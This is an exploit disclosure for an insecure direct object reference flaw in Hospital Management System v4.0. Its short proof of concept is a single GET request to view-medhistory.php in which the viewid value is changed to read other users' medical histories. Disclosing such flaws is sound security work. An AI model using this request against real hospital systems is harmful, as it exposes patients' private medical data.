# Exploit Title: Hospital Management System v4.0 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://phpgurukul.com/hospital-management-system-in-php
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v4.0
## Exploit Description:
## Hospital Management System v4.0 suffers from IDOR - Broken Access Control Vulnerability allowing attacker user to look up the other user's medical history(horizontal privilege escalation).

## -----------------------------------------------POC-------------------------------------------------------------------
```
GET /hospital/hms/view-medhistory.php?viewid=3(CHANGE HERE) HTTP/1.1
...
```





